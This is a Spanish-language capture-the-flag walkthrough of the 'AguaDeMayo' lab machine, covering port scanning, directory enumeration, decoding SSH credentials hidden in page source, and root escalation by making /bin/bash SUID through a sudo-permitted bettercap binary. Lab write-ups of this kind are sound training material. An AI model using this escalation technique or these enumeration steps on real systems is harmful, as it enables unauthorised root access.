Maquina: AguaDeMayo 

Autor: The Hacker Labs

Dificultad: Facil

![Screenshot 2024-11-08 174356](https://github.com/user-attachments/assets/c2b09479-e47f-4a93-9b31-da521bb88b84)

ping 172.17.0.2 -c 1
![Screenshot 2024-11-08 170032](https://github.com/user-attachments/assets/4af11b81-116a-4878-8bef-8bd6f8317fdf)

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv
![Screenshot 2024-11-08 170117](https://github.com/user-attachments/assets/6b89c8d4-2175-445e-a3e6-26da80af094a)

Encontramos el puerto 22 y el puerto 80.

Accedemos a la web y encontramos esto:

![Screenshot 2024-11-08 174535](https://github.com/user-attachments/assets/5357a188-9e59-48fd-a33e-d79c564b4ad0)

Vamos a hacer un reconocimiento con gobuster:
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Encontramos el directorio images, vamos a acceder:

http://172.17.0.2/imagenes/

Vemos una imagen, vamos a descargarla:

![Screenshot 2024-11-08 171645](https://github.com/user-attachments/assets/b54d185b-a12f-4354-8d1e-937a7941ab2a)

Vamos a aplicar esteganografía

Pero nos pide una contraseña. Si miramos el código fuente de Apache, al final vemos esto:

![Screenshot 2024-11-08 173114](https://github.com/user-attachments/assets/34284973-abf2-4450-b903-c62ce3701218)

Vamos a descifrarlo en dcode.fr.

En esta web lo podemos descodificar y nos da este resultado:

![Screenshot 2024-11-08 173805](https://github.com/user-attachments/assets/0f3b500c-3a91-452d-bd9e-b7e49bb9774a)

la imagen tiene el nombre de agua_ssh. Agua es el usuario y la contraseña es bebeaguaqueessano.

Accedemos por ssh

ssh agua@172.17.0.2

![Screenshot 2024-11-08 174024](https://github.com/user-attachments/assets/38b39aed-dc57-437e-9c72-f298f5a090ba)

Si hacemos un sudo -l vemos lo siguiente:

Ejecutamos el binario: 
sudo -u root /usr/bin/bettercap

Cambiamos el permiso a suid de la bash
! chmod u+s /bin/bash

Ahora salimos y ejecutamos bash -p seremos root
bash -p

whoami

![Screenshot 2024-11-08 174137](https://github.com/user-attachments/assets/cba6e884-6a07-4bde-b55c-7fb3bdf95cb0)
